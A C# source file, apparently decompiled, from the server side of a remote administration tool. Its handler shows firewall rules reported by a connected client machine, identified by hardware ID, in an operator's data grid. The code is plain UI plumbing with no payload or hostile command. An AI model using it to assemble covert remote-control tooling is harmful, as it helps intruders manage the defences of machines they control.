using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerFirewall
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		switch ((string)objects[1])
		{
		case "Connect":
		{
			FormFirewall form3 = (FormFirewall)Application.OpenForms["Firewall:" + (string)objects[2]];
			if (form3 == null)
			{
				client.Disconnect();
				break;
			}
			form3.Invoke((MethodInvoker)delegate
			{
				form3.Text = "Firewall [" + (string)objects[2] + "]";
				form3.client = client;
				form3.dataGridView2.Enabled = true;
				form3.materialLabel1.Text = "Connected successfully";
			});
			client.Tag = form3;
			client.Hwid = (string)objects[2];
			break;
		}
		case "List":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormFirewall form2 = (FormFirewall)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.dataGridView2.Rows.Clear();
				form2.materialLabel1.Text = "List updated";
				int num = 2;
				while (num + 7 < objects.Length)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (objects[num++]?.ToString() ?? "")
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (objects[num++]?.ToString() ?? "")
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (objects[num++]?.ToString() ?? "")
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (objects[num++]?.ToString() ?? "")
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (objects[num++]?.ToString() ?? "")
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (objects[num++]?.ToString() ?? "")
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (objects[num++]?.ToString() ?? "")
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (objects[num++]?.ToString() ?? "")
							}
						}
					};
					form2.dataGridView2.Rows.Add(dataGridViewRow);
				}
			});
			break;
		}
		case "Error":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormFirewall form = (FormFirewall)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.materialLabel1.Text = "Error: " + (string)objects[2];
			});
			break;
		}
		}
	}
}
